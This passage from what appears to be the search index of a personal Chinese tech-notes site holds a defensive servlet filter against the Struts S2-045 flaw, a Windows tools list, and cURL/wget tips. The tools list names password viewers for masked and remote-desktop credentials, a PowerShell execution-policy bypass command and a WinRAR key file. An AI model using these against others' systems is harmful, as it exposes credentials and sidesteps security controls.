arg0, ServletResponse arg1,\nFilterChain arg2) throws IOException, ServletException {\n\nHttpServletRequest request = (HttpServletRequest) arg0;\nHttpServletResponse response = (HttpServletResponse) arg1;\n\nString contentType=request.getHeader(\"Content-Type\");\n\nif(contentType!=null&amp;&amp;!contentType.equals(\"\")&amp;&amp;!contentType.equalsIgnoreCase(www_url_encode)&amp;&amp;!contentType.equalsIgnoreCase(mul_data)&amp;&amp;!contentType.equalsIgnoreCase(txt_pla)){\nresponse.setContentType(\"text/html;charset=UTF-8\");\nresponse.getWriter().write(\"\u975e\u6cd5\u8bf7\u6c42Content-Type\uff01\");\nreturn;\n}\narg2.doFilter(request, response);\n}\n\npublic void init(FilterConfig arg0) throws ServletException {\n}\n}\n</code></pre> <p>\u5047\u8bbe\u670d\u52a1\u5668\u4e0a\u7684<code>java -version</code>\u544a\u8bc9\u6211\u4eecjava\u7684\u7248\u672c\u662f1.7\u7684\uff0c\u624b\u91cc\u53c8\u6ca1\u6709\u5f53\u524d\u7f51\u7ad9\u7684\u9879\u76ee\u6587\u4ef6\uff0c\u9700\u8981\u8fd9\u6837\u8fdb\u884c\u7f16\u8bd1\uff1a</p> <p>eclipse\u65b0\u5efa\u4e00\u4e2a\u5de5\u7a0b\uff0c\u65b0\u5efa\u7c7b\u590d\u5236\u4ee5\u4e0a\u4ee3\u7801\uff0c\u9879\u76ee\u5c5e\u6027\u7684<code>Java Build Path</code>\u4e2d\u7684<code>Libraries</code>\u6dfb\u52a0tomcat\u4e2d\u7684<code>servlet-api.jar</code>\uff0c<code>Java Complier</code>\u9875\u9762\u4e2d\u9009\u62e9Complier compliance level\u4e3a1.7</p> <p>eclipse\u81ea\u52a8\u901a\u8fc7\u7f16\u8bd1\u540e\uff0c\u5373\u53ef\u5c06\u6b64SecurityFilter.class\u6587\u4ef6\u4f20\u81f3\u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7684WEB-INF/classes\u76ee\u5f55\u4e0b\u3002</p> <p>\u8fd9\u91cc\u6709\u6211\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684class\u6587\u4ef6\uff1a1.6 1.7 1.8</p> <p>\u2461 \u5c06\u4e0b\u9762\u7684\u4ee3\u7801\u52a0\u5165WEB-INF/web.xml\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2afilter\u4e4b\u524d\u3002</p> <p>\u64cd\u4f5c\u4e4b\u524d\u8bf7\u8bb0\u5f97\u5907\u4efd</p> <pre><code>&lt;filter&gt;\n&lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;\n&lt;filter-class&gt;SecurityFilter&lt;/filter-class&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n&lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;\n&lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n</code></pre> <p>\u5982\u56fe\u6240\u793a</p> <p></p> <p>\u2462 \u91cd\u542f\u5e94\u7528\u5373\u53ef</p> <p>\u91cd\u542f\u53ef\u4ee5\u5728tomcat\u7684manager\u9875\u9762Reload\u5e94\u7528\uff0c\u6216\u8005\u76f4\u63a5\u91cd\u542f\u6574\u4e2atomcat</p> <p>\u5982\u679c\u5e94\u7528\u65e0\u6cd5\u542f\u52a8\uff0c\u5728tomcat\u4e0b\u6709logs\u76ee\u5f55\u53ef\u4ee5\u770b\u5230\u4e3a\u5565\u51fa\u9519</p>"},{"location":"S2-045/#_3","title":"\u6d4b\u8bd5\u6548\u679c","text":"<p>\u671f\u5f85\u4e00\u4e2a\u66f4\u8d1f\u8d23\u4efb\u7684\u6f0f\u6d1e\u62ab\u9732\u8fc7\u7a0b\uff0c\u671f\u5f85\u4e00\u4e2a\u66f4\u52a0\u5b89\u5168\u7684\u4e92\u8054\u7f51</p> <p>Author: zjuchenyuan</p> <p>Source: https://py3.io/S2-045.html</p>"},{"location":"Ubuntu/","title":"Ubuntu\u684c\u9762\u7248\u4f7f\u7528","text":"<p>\u4f7f\u7528ubuntu16.04\u684c\u9762\u7248\u7684\u4e00\u4e9b\u6298\u817e</p>"},{"location":"Ubuntu/#google","title":"\u5b89\u88c5Google\u62fc\u97f3\u5e76\u914d\u7f6e\u4ee3\u7406","text":"<p>\u5b89\u88c5\u8bf7\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0-ubuntu\u5b89\u88c5\u8c37\u6b4c\u62fc\u97f3\u8f93\u5165\u6cd5</p> <p>\u5176\u4e2d\u5728<code>im-config</code>\u5207\u6362\u4e3a<code>fcitx</code>\u540e\uff0c\u65e0\u9700\u91cd\u542f\uff0c\u53ea\u9700\u8981\u6ce8\u9500\u540e\u518d\u6b21\u767b\u5f55\u5373\u53ef\uff08\u6ce8\u9500\u4e0d\u4f1a\u5f71\u54cdscreen\u4e2d\u7684\u4efb\u52a1\uff09</p> <p>\u5b89\u88c5\u540e\u6700\u4e3a\u6709\u7528\u7684\u4e91\u5019\u9009\u529f\u80fd\u7531\u4e8e\u9700\u8981\u914d\u7f6e\u4ee3\u7406\u624d\u80fd\u7528\uff0c\u914d\u7f6e\u65b9\u6cd5\uff1a \u6253\u5f00\u4e00\u4e2aterminal\uff08\u5efa\u8bae\u542f\u52a8\u4e00\u4e2ascreen\uff09\uff0c\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u7136\u540e\u91cd\u542ffcitx\uff1a</p> <pre><code>export http_proxy=\"http://127.0.0.1:8118\"\nexport https_proxy=\"http://127.0.0.1:8118\"\nfcitx -r\n</code></pre>"},{"location":"WindowsSoftware/","title":"Windows Software","text":"<p>\u81ea\u5df1\u65e5\u5e38\u7528\u5230\u7684\u4e00\u4e9b\u5de5\u5177\u54af</p>"},{"location":"WindowsSoftware/#emeditor","title":"Emeditor","text":"<p>https://www.emeditor.com/</p> <p>\u4e0b\u8f7d\uff1ahttp://files.emeditor.com/emed64_16.3.1.exe</p> <p>\u6253\u5f00\u8d85\u5927\u6587\u4ef6\uff0c\u8bed\u6cd5\u9ad8\u4eae\uff0c\u6279\u5904\u7406\u66ff\u6362\u7b49\u597d\u7528\u7684\u529f\u80fd</p>"},{"location":"WindowsSoftware/#everything","title":"Everything","text":"<p>https://www.voidtools.com/</p> <p>\u4e0b\u8f7d\uff1ahttps://www.voidtools.com/Everything-1.4.1.809b.x64.zip</p> <p>\u5feb\u901f\u5168\u76d8\u641c\u7d22\uff0c\u4e0d\u77e5\u9053\u6bd4windows\u81ea\u5e26\u7684\u641c\u7d22\u5feb\u5230\u54ea\u91cc\u53bb\u4e86</p>"},{"location":"WindowsSoftware/#sysinternals-utilities","title":"Sysinternals Utilities","text":"<p>https://technet.microsoft.com/en-us/sysinternals/bb545027</p> <p>\u4efb\u52a1\u7ba1\u7406\u5668 https://download.sysinternals.com/files/ProcessExplorer.zip</p>"},{"location":"WindowsSoftware/#cloc","title":"CLOC\u4ee3\u7801\u7edf\u8ba1\u5229\u5668","text":"<p>\u4e0b\u8f7d\uff1ahttps://github.com/AlDanial/cloc/releases/download/v1.70/cloc-1.70.exe</p> <p>Cloc\u662f\u4e00\u6b3e\u4f7f\u7528Perl\u8bed\u8a00\u5f00\u53d1\u7684\u5f00\u6e90\u4ee3\u7801\u7edf\u8ba1\u5de5\u5177\uff0c\u652f\u6301\u591a\u5e73\u53f0\u4f7f\u7528\u3001\u591a\u8bed\u8a00\u8bc6\u522b\uff0c\u80fd\u591f\u8ba1\u7b97\u6307\u5b9a\u76ee\u6807\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u4e2d\u7684\u6587\u4ef6\u6570(files)\u3001\u7a7a\u767d\u884c\u6570(blank)\u3001\u6ce8\u91ca\u884c\u6570(comment)\u548c\u4ee3\u7801\u884c\u6570(code)\u3002</p>"},{"location":"WindowsSoftware/#menumgr","title":"MenuMgr \u53f3\u952e\u83dc\u5355\u7ba1\u7406","text":"<p>\u8fd8\u53f3\u952e\u83dc\u5355\u4e00\u4efd\u6e05\u51c0</p> <p>MenuMgr</p>"},{"location":"WindowsSoftware/#bash","title":"\u6587\u4ef6\u5939\u80cc\u666f\u53f3\u952e\u6dfb\u52a0bash","text":"<p>\u53d1\u73b0\u81ea\u5df1\u7ecf\u5e38\u9700\u8981\u5728\u5f53\u524d\u8def\u5f84\u4e0b\u6253\u5f00bash\uff0c\u4e4b\u524d\u6211\u90fd\u662f\u5728\u5730\u5740\u680f\u8f93\u5165bash\u56de\u8f66 \u4f46\u8fd9\u6837\u7684\u526f\u4f5c\u7528\u662f\u4e0d\u80fd\u518d\u65b9\u4fbf\u5730\u590d\u5236\u5f53\u524d\u8def\u5f84\u4e86</p> <p>\u73b0\u5728\u6211\u5c06bash\u6dfb\u52a0\u5230\u53f3\u952e\u83dc\u5355 \u53ea\u9700\u9f20\u6807\u70b9\u51fb\u4e24\u6b21\u5373\u53ef\u6253\u5f00bash</p> <p>regedit\u5b9a\u4f4d\u5230</p> <pre><code>\u8ba1\u7b97\u673a\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\\n</code></pre> <p>\u65b0\u5efa\u9879bash \u518d\u5728bash\u4e2d\u65b0\u5efa\u9879command \u4fee\u6539command\u7684\u9ed8\u8ba4\u4e3a<code>bash</code></p> <p>\u987a\u5e26\u53ef\u4ee5\u628a\u5728\u6b64\u5904\u6253\u5f00\u547d\u4ee4\u7a97\u53e3\u7ed9\u663e\u793a\u51fa\u6765\uff1a\u540c\u4e00\u4e2a\u6587\u4ef6\u5939\u91cc\u9762\u6709\u4e2acmd \u4f46\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u9879 \u5220\u6389\u5373\u53ef</p> <p>\u5982\u679c\u4fee\u6539\u6ce8\u518c\u8868\u6ca1\u6709\u6743\u9650\uff0c\u53f3\u952e\u6539\u6743\u9650 \u5148\u6539\u6240\u6709\u8005\u518d\u5bf9everyone\u5141\u8bb8\u5b8c\u5168\u63a7\u5236\u5373\u53ef</p>"},{"location":"WindowsSoftware/#u","title":"\u8f6f\u5a92U\u76d8\u542f\u52a8\u76d8\u5236\u4f5c","text":"<p>usbbooter.exe</p>"},{"location":"WindowsSoftware/#winrar","title":"WinRAR","text":"<p>\u538b\u7f29\u89e3\u538b\u7f29\uff0c\u6211\u53ea\u7528WinRAR\u548c7zip</p> <p>winrar.exe</p> <p>winrar32bit.exe</p> <p>rarreg.key</p>"},{"location":"WindowsSoftware/#burpsuite","title":"BurpSuite","text":"<p>\u53d1\u73b0app\u7684\u6f0f\u6d1e\u5565\u7684\uff0c\u8fd8\u662f\u633a\u6709\u7528\u7684~</p> <p>burpsuite v1.7.11.zip</p> <p>\u4f7f\u7528\u65b9\u6cd5\uff1a\u5b89\u88c5Java\uff0c\u542f\u52a8\u540e\u8bbe\u7f6e\u76d1\u542c\u5728\u6240\u6709\u7f51\u5361\uff0c\u5bfc\u51fa\u8bc1\u4e66CA.crt\u53d1\u9001\u5230\u624b\u673a\uff0c\u624b\u673a\u5bfc\u5165\u8bc1\u4e66\uff0c\u624b\u673a\u5fd8\u8bb0Wifi\u540e\u8fde\u63a5wifi\u65f6\u8bbe\u7f6e\u4ee3\u7406\uff0c\u624b\u673a\u542f\u52a8APP\uff0c\u67e5\u770b\u6d41\u91cf\u54af~</p>"},{"location":"WindowsSoftware/#bencode-editor","title":"BEncode Editor","text":"<p>\u521b\u5efa/\u7f16\u8f91\u79cd\u5b50\u4fe1\u606f\uff0c\u505a\u4e00\u4e2a\u52e4\u594b\u7684\u642c\u8fd0\u5de5\u2026</p> <p>BEncode Editor.exe</p>"},{"location":"WindowsSoftware/#win10-windows","title":"Win10 Windows\u7167\u7247\u67e5\u770b\u5668","text":"<p>From: http://www.xitongcheng.com/jiaocheng/win10_article_12240.html</p> <p>Win+R\u6253\u5f00regedit\uff0c\u627e\u5230HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations</p> <p>\u53f3\u952e\uff0c\u65b0\u5efa\u5b57\u7b26\u4e32\u503c\uff0c\u547d\u540d\u4e3a.jpg\uff0c\u503c\u4e3aPhotoViewer.FileAssoc.Tiff</p> <p>\u6211\u7684\u60c5\u51b5\u662f\u539f\u5148\u6709.tif\u548c.tiff\u7684\uff0c\u8fd8\u9700\u8981\u65b0\u5efa\u8fd9\u4e9b\u540e\u7f00\u540d.jpeg .bmp .png .gif</p> <p>\u521b\u5efa\u540e\u518d\u770b\u6253\u5f00\u65b9\u5f0f\u5c31\u6709\u4e86Windows\u7167\u7247\u67e5\u770b\u5668</p>"},{"location":"WindowsSoftware/#_1","title":"\u661f\u53f7\u5bc6\u7801\u67e5\u770b","text":"<p>\u4e00\u822c\u662f\u7528\u4e0d\u7740 AsteriskPassword.exe</p>"},{"location":"WindowsSoftware/#_2","title":"\u8fdc\u7a0b\u8fde\u63a5\u5bc6\u7801\u67e5\u770b","text":"<p>mstscpass.exe</p>"},{"location":"WindowsSoftware/#gho","title":"GHO\u6587\u4ef6\u67e5\u770b","text":"<p>\u4e5f\u662f\u5f88\u4e45\u6ca1\u7528\u4e86\u554a Ghostexp.exe</p>"},{"location":"WindowsSoftware/#_3","title":"\u6587\u4ef6\u54c8\u5e0c\u8ba1\u7b97","text":"<p>Linux\u4e0b\u76f4\u63a5\u7528md5sum sha1sum\u5c31\u591f\u4e86</p> <p>Hash.exe</p>"},{"location":"WindowsSoftware/#tcping","title":"tcping \u68c0\u6d4b\u7aef\u53e3\u662f\u5426\u5f00\u653e","text":"<p>\u4e00\u76f4ping\u7684\u7528\u6cd5: <code>tcping -t py3.io 443</code></p> <p>tcping.exe</p>"},{"location":"WindowsSoftware/#nginx-1118","title":"Nginx 1.11.8","text":"<p>nginx.zip</p>"},{"location":"WindowsSoftware/#bash-on-win10","title":"Bash On Win10","text":""},{"location":"WindowsSoftware/#mount","title":"mount\u6302\u8f7d\u5176\u4ed6\u5206\u533a","text":"<pre><code>mount -t drvfs D: /mnt/d\n</code></pre>"},{"location":"WindowsSoftware/#vmware-vcenter-converter","title":"VMware vCenter Converter","text":"<p>\u65e0\u9700\u5173\u673a\uff0c\u65e0\u9700\u79fb\u52a8\u786c\u76d8\u5c06\u7269\u7406\u673a\u8f6c\u4e3a\u865a\u62df\u673a\u955c\u50cf</p> <p>\u57fa\u4e8eWindows\u7684\u5377\u5f71\u590d\u5236\u529f\u80fd</p> <p>http://www.softpedia.com/get/System/System-Miscellaneous/VMware-Converter.shtml</p>"},{"location":"WindowsSoftware/#powershell","title":"\u547d\u4ee4\u884c\u5f00\u5173\u84dd\u7259 powershell","text":"<p>\u53c2\u8003\uff1a https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/https://superuser.com/questions/1168551/turn-on-off-bluetooth-radio-adapter-from-cmd-powershell-in-windows-10</p> <p>\u7ed5\u8fc7powershell\u6267\u884c\u5b89\u5168\u7b56\u7565\u53c2\u8003\uff1a https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</p> <p>\u5c06\u8fd9\u4e2a\u4fdd\u5b58\u4e3ab.ps1</p> <pre><code>[CmdletBinding()] Param (\n[Parameter(Mandatory=$true)][ValidateSet('Off', 'On')][string]$BluetoothStatus\n)\nIf ((Get-Service bthserv).Status -eq 'Stopped') { Start-Service bthserv }\nAdd-Type -AssemblyName System.Runtime.WindowsRuntime\n$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]\nFunction Await($WinRtTask, $ResultType) {\n$asTask = $asTaskGeneric.MakeGenericMethod($ResultType)\n$netTask = $asTask.Invoke($null, @($WinRtTask))\n$netTask.Wait(-1) | Out-Null\n$netTask.Result\n}\n[Windows.Devices.Radios.Radio,Windows.System.Devices,ContentType=WindowsRuntime] | Out-Null\n[Windows.Devices.Radios.RadioAccessStatus,Windows.System.Devices,ContentType=WindowsRuntime] | Out-Null\nAwait ([Windows.Devices.Radios.Radio]::RequestAccessAsync()) ([Windows.Devices.Radios.RadioAccessStatus]) | Out-Null\n$radios = Await ([Windows.Devices.Radios.Radio]::GetRadiosAsync()) ([System.Collections.Generic.IReadOnlyList[Windows.Devices.Radios.Radio]])\n$bluetooth = $radios | ? { $_.Kind -eq 'Bluetooth' }\n[Windows.Devices.Radios.RadioState,Windows.System.Devices,ContentType=WindowsRuntime] | Out-Null\nAwait ($bluetooth.SetStateAsync($BluetoothStatus)) ([Windows.Devices.Radios.RadioAccessStatus]) | Out-Null\n</code></pre> <p>\u5f00\u542f\u84dd\u7259\uff1a</p> <pre><code>powershell -ExecutionPolicy Bypass -File ./b.ps1 -BluetoothStatus On\n</code></pre> <p>\u5173\u95ed\u5c31\u662fOff</p>"},{"location":"WindowsSoftware/#bash_1","title":"\u6587\u4ef6\u5939\u80cc\u666f\u53f3\u952e\u76f4\u63a5\u663e\u793abash","text":"<p>\u9ed8\u8ba4\u9700\u8981\u6309\u4f4fShift\u53f3\u952e\u624d\u4f1a\u663e\u793a</p> <p>HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\WSL</p> <p>\u5220\u9664\u5176\u4e2d\u7684Extended\u9879\u5373\u53ef\uff0c\u53ef\u80fd\u6ca1\u6709\u6743\u9650\u9700\u8981\u5148\u83b7\u5f97\u6240\u6709\u6743\u518d\u7ed9\u81ea\u5df1\u6743\u9650\uff0c\u53c2\u8003</p> <p>\u9644\u4e0a\u9ed8\u8ba4\u7684command:</p> <pre><code>wsl.exe --cd \"%V\"\npowershell.exe -noexit -command Set-Location -literalPath '%V'\ncmd.exe /s /k pushd \"%V\"\n</code></pre>"},{"location":"WindowsSoftware/#sshfs","title":"sshfs\u6302\u8f7d\u8fdc\u7a0b\u76ee\u5f55","text":"<p>https://github.com/billziss-gh/sshfs-win</p> <p>\u76f8\u6bd4\u7384\u5b66\u7684windows\u5171\u4eab\uff0c\u8fd8\u662fssh\u66f4\u52a0\u7b80\u5355\u9760\u8c31\uff0c\u53ea\u662f\u6709\u65f6\u5019ssh.exe\u4f1aCPU100%\u5361\u4f4f\uff0c\u9700\u8981\u4efb\u52a1\u7ba1\u7406\u5668kill</p> <p>\u4f7f\u7528\u524d\u9700\u8981\u5148\u8ba9ssh\u5f00\u542f\u5bc6\u7801\u9a8c\u8bc1\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528<code>ssh -i /dev/null</code>\u53bb\u8fde\u63a5\u6d4b\u8bd5\u80fd\u5426\u767b\u5f55</p> <p>\u53ef\u4ee5\u7528\u591a\u4e2a<code>..\\</code>\u6302\u8f7d\u4e0a\u7ea7\u76ee\u5f55</p> <pre><code>net use h: \\\\sshfs\\root@ip!2222\\..\\\n</code></pre>"},{"location":"WindowsSoftware/#windows","title":"\u547d\u4ee4\u884cwindows\u65f6\u95f4\u540c\u6b65","text":"<p>\u53c2\u8003\uff1a https://answers.microsoft.com/en-us/windows/forum/windows_10-other_settings/how-to-force-windows-10-time-to-synch-with-a-time/20f3b546-af38-42fb-a2d0-d4df13cc8f43</p> <pre><code>net start w32time\nw32tm /register\nw32tm /resync\n</code></pre> <p>\u540c\u65f6\uff0c\u4f60\u53ef\u80fd\u60f3\u8981\u5c06Windows Time\u670d\u52a1\u8bbe\u7f6e\u4e3a\u81ea\u52a8\u542f\u52a8</p>"},{"location":"WindowsSoftware/#windows_1","title":"Windows\u6fc0\u6d3b","text":"<p>\u67e5\u770b\u6fc0\u6d3b\u4fe1\u606f\uff1a</p> <pre><code>slmgr.vbs /dli\n</code></pre> <p>\u8bbe\u7f6ekms\u670d\u52a1\u5668\u5730\u5740\uff1a</p> <pre><code>slmgr.vbs /skms 10.203.8.58\nslmgr.vbs /ato\n</code></pre> <p>\u67e5\u770b\u8fc7\u671f\u65f6\u95f4\uff1a</p> <pre><code>slmgr.vbs /xpr\n</code></pre>"},{"location":"WindowsSoftware/#bitlocker","title":"\u67e5\u770bBitLocker\u52a0\u5bc6\u8fdb\u5ea6","text":"<p>\u65b0\u7684win10\u91cc\u4e0d\u4f1a\u5728UI\u663e\u793a\u52a0\u5bc6\u8fdb\u5ea6\uff0c\u53ea\u80fd\u9760\u7ba1\u7406\u5458\u6743\u9650\u7684\u547d\u4ee4\u884c\u67e5\u8be2\uff1a</p> <p>manage-bde -status</p>"},{"location":"WindowsSoftware/#_4","title":"\u627e\u56de\u6d88\u5931\u7684\u7a97\u53e3","text":"<p>\u53c2\u8003 Windows\u7cfb\u7edf\u7a97\u53e3\u6d88\u5931\u4e4b\u8c1c\u53ca\u89e3\u51b3\u65b9\u6cd5</p> <p>\u611f\u53f9\u4e00\u4e0bwindows\u7684\u5411\u4e0b\u517c\u5bb9\u505a\u5f97\u771f\u597d\uff0c2009\u5e74\u7684\u6587\u7ae0\u73b0\u5728\u4ecd\u7136\u6709\u6548</p> <p>Win10\u4efb\u52a1\u680f\u53f3\u952e\u6ca1\u6cd5\u5bf9\u7a97\u53e3\u8fdb\u884c\u79fb\u52a8\u4e86\uff0c\u89e3\u51b3\u65b9\u6848\u662f\u70b9\u51fb\u540eAlt+\u7a7a\u683c\uff0c\u7136\u540e\u6309M\uff0c\u6309\u65b9\u5411\u952e\uff0c\u518d\u79fb\u52a8\u9f20\u6807\u5373\u53ef</p>"},{"location":"cURL/","title":"cURL","text":"<p>curl\u8fd9\u4e48\u6709\u7528\u7684\u4e1c\u897f\uff0c\u8fd8\u662f\u5355\u72ec\u5f00\u4e2a\u6587\u6863\u54af~</p> <p></p> <p>\u5927\u540d\u9f0e\u9f0e\u7684cURL\uff0c\u4e0d\u5fc5\u591a\u8a00\uff1b\u53ea\u662f\u5b83\u7684\u547d\u4ee4\u884c\u7684\u8fd0\u884c\u65b9\u5f0f\u4e0elibcurl\u7528\u8d77\u6765\u5dee\u5f02\u5f88\u5927\uff08\u5982\u6bd4\u8f83php\u7684curl\u7528\u6cd5\uff09</p> <p>\u5b98\u65b9\uff1ahttps://curl.haxx.se/</p> <p>\u7b80\u5355\u5165\u95e8\uff1ahttp://www.bathome.net/thread-1761-1-1.html</p> <p>\u5c06curl\u8f6c\u4e3apython requests http://curl.trillworks.com/</p> <p>\u4e0b\u8f7d7.51 x64\u7684Win\u7248\u672c</p> <p>\u4e0b\u8f7d7.16 32bit\u7684curl32.exe</p>"},{"location":"cURL/#_1","title":"\u6a21\u62df\u6d4f\u89c8\u5668\u8bf7\u6c42","text":"<p>\u7528Chrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\uff0c\u5bf9\u8bf7\u6c42\u53f3\u952e\uff0cCopy as cURL\u5c31\u597d\u5566</p> <p>\u5176\u4e2d\u5982\u679c\u9009\u62e9\u4e86cmd\u7684\u7248\u672c\uff0c\u662f\u4e0d\u80fd\u7528\u4e8e\u5199bat\u7684\uff0c\u6211\u7684\u505a\u6cd5\u662f\u590d\u5236\u6210bash\u7684\u7248\u672c\u7528python\u5faa\u73af\u4e4b</p>"},{"location":"cURL/#_2","title":"\u57fa\u672c\u6559\u7a0b","text":"<pre><code>REM \u5728bat\u4e2dREM\u547d\u4ee4\u8868\u793a\u6ce8\u91ca\u884c\n\nREM \u7b80\u5355\u7684get\u4e00\u4e0b\ncurl http://ip.cn\n\nREM \u4fdd\u5b58\u5230\u6587\u4ef6\u5e76\u65ad\u70b9\u7eed\u4f20\uff08\u53ef\u4ee5\u4e0d\u6307\u5b9a\u6587\u4ef6\u540d-O\uff09\ncurl -o iplist.txt -c  http://f.ip.cn/rt/chnroutes.txt\n\nREM POST\u8bf7\u6c42\uff0c\u8bbe\u7f6eReferer\uff0c\u5e76\u4f7f\u7528\u4ee3\u7406\ncurl http://httpbin.org/post --data \"something=somedata\" -H \"Referer: http://github.com/zjuchenyuan/\" --proxy socks5://127.0.0.1:1080\n\nREM \u6587\u4ef6\u4e0a\u4f20 @\u6587\u4ef6\u540d\nREM POST\u6a21\u5f0f\u4e0b\u7684\u6587\u4ef6\u4e0a\u7684\u6587\u4ef6\u4e0a\u4f20\uff0c\u6bd4\u5982\nREM &lt;form method=\"POST\" enctype=\"multipart/form-data\" action=\"http://cgi2.tky.3web.ne.jp/~zzh/up_file.cgi\"&gt;\nREM &lt;input type=file name=upload&gt;\nREM &lt;input type=submit name=nick value=\"go\"&gt;\nREM &lt;/form&gt;\nREM \u8fd9\u6837\u4e00\u4e2aHTTP\u8868\u5355\uff0c\u6211\u4eec\u8981\u7528curl\u8fdb\u884c\u6a21\u62df\uff0c\u5c31\u8be5\u662f\u8fd9\u6837\u7684\u8bed\u6cd5\uff1a\ncurl -F upload=@localfile -F nick=go http://cgi2.tky.3web.ne.jp/~zzh/up_file.cgi\n\nREM \u767b\u5f55\u8def\u7531\u5668\ncurl http://192.168.1.1 -u admin:admin\n\nREM \u5b58\u4e0bSet-Cookie\ncurl -D cookie0001.txt http://www.yahoo.com\n\nREM \u4f7f\u7528\u5b58\u50a8\u7684Cookie\ncurl -b cookie0001.txt http://www.yahoo.com\n\nREM dict\u534f\u8bae\u67e5\u5b57\u5178\uff0c\u663e\u793a\u8be6\u7ec6\u7684\u8bf7\u6c42\u4fe1\u606f\ncurl dict://www.dict.org/d:computer -v\n</code></pre>"},{"location":"cURL/#_3","title":"\u8fd8\u53ef\u4ee5\u5faa\u73af\u54df","text":"<p>curl -OJ http://example.com/[1-100].jpg</p> <p>curl -o \u201c#1.html\u201d http://www.example.com/page/[1-20]</p>"},{"location":"cURL/#wget0bs","title":"wget\u57280b/s\u65f6\u81ea\u52a8\u91cd\u8fde","text":"<p>From: https://askubuntu.com/questions/72663/how-to-make-wget-retry-download-if-speed-goes-below-certain-threshold</p> <p>\u7528\u6cd5\uff1a</p> <pre><code>wget -c --tries=0 --read-timeout=20 [URL]\n</code></pre> <p>\u5176\u4e2d-c\u8868\u793a\u65ad\u70b9\u7eed\u4f20\uff0c\u2013tries=0\u8868\u793a\u65e0\u9650\u6b21\u91cd\u8bd5\uff0c\u2013read-timeout\u6307\u5b9a20s\u65e0\u7f51\u7edc\u6d3b\u52a8\u5c31\u8ba4\u4e3a\u51fa\u9519(\u9ed8\u8ba4\u662f15\u5206\u949f)</p>"},{"location":"cURL/#wget","title":"wget\u9650\u5236\u5355\u6587\u4ef6\u6700\u5927\u5927\u5c0f","text":"<p>\u6765\u6e90\uff1a https://yurichev.com/wget.html</p> <p>\u53ef\u4ee5\u4e0b\u8f7d\u5230\u4e8c\u8fdb\u5236\u76f4\u63a5\u7528</p> <p>\u589e\u52a0\u4e86<code>--limit-size</code>\u53c2\u6570\uff0c\u6bd4\u5982\u6279\u91cf\u4e0b\u8f7d\u4e00\u4e2aftp\u94fe\u63a5\uff1a</p> <pre><code>wget --limit-size=10g --restrict-file-names=nocontrol -nH --tries=0 --read-timeout=20 -m ftp://xxx \n</code></pre>"},{"location":"ccfbadge/","title":"CCF Badge","text":"<p>\u5728dblp\u641c\u7d22\u7ed3\u679c\u4e2d\u9ad8\u4eae\u663e\u793a\u5b89\u5168\u9876\u4f1a\u548cCCF\u5206\u7c7b+\u65b9\u5411</p> <p>\u5b89\u88c5 Chrome\u63d2\u4ef6Tampermonkey \u540e\u70b9\u51fb\u5b89\u88c5\uff1a https://blog.chenyuan.me/code/ccfbadge.user.js</p> <p>\u6548\u679c\uff1a</p> <p>https://dblp.org/search?q=use-after-free</p> <p></p>"},{"location":"ccfbadge/#_1","title":"\u6570\u636e\u5904\u7406\u8fc7\u7a0b","text":"<ul> <li>\u4e0b\u8f7d\u5b98\u65b9\u76ee\u5f55PDF: https://www.ccf.org.cn/Academic_Evaluation/By_category/</li> <li>\u8f6c\u6362\u6210Excel: https://smallpdf.com/pdf-to-excel</li> <li>Python\u8bfb\u53d6excel\u5904\u7406\uff1a\u90e8\u5206dblp\u6709\u94fe\u63a5\u4f46pdf\u4e2d\u4e0d\u662fdblp\u94fe\u63a5\u7684\u9700\u8981\u624b\u5de5\u66f4\u6b63\uff0casiaccs\u7684\u94fe\u63a5\u9700\u8981\u4e0eccs\u533a\u5206</li> </ul> <pre><code>import xlrd, json\nfrom pprint import pprint\nwb=xlrd.open_workbook(\"\u4e2d\u56fd\u8ba1\u7b97\u673a\u5b66\u4f1a\u63a8\u8350\u56fd\u9645\u5b66\u672f\u4f1a\u8bae\u548c\u671f\u520a\u76ee\u5f55-2019-converted.xlsx\")\ntype = \"\"\nallccf = {}\nfor sid in range(wb.nsheets):\n    s = wb.sheet_by_index(sid)\n    data = [tuple([s.cell_value(i,j) for j in range(s.ncols)]) for i in range(s.nrows)]\n    for i,line in enumerate(data):\n        if line[0]==\"\u5e8f\u53f7\":\n            abc = data[i-1][0].split(\"\u3001\")[1].replace(\"\u7c7b\", \"\").strip()\n            if i-2&gt;=0:\n                type = data[i-2][0].split(\"\\n\")[-1].strip().strip(\"\uff08(\uff09)\").replace(\"\uff0f\",\"/\").split(\"/\")[0].replace(\"\u8ba1\u7b97\u673a\",\"\")\n            table = data[i+1:]\n    newtable = []\n    for i in table:\n        if not any([str(j).strip() for j in i]):\n            continue\n        id, simple, full, publisher, url = [str(j).replace(\"\\n\",\" \").replace(\"  \",\" \") for j in i[:-1]] # remove last empty column\n        #print(i)\n        url = {\n            \"Performance Evaluation: An International Journal\":\"https://dblp.uni-trier.de/db/journals/pe\",\n            'Journal of Electronic Testing-Theory and Applications': \"https://dblp.uni-trier.de/db/journals/et\",\n            \"Hot Chips: A Symposium on High Performance Chips\": \"https://dblp.uni-trier.de/db/conf/hotchips/index.html\",\n            \"ACM Transactions on Privacy and Security\":\"https://dblp.org/db/journals/tissec/\",\n            \"Computer Law and Security Review\":\"https://dblp.org/db/journals/clsr/\",\n            \"IFIP WG 11.9 International Conference on Digital 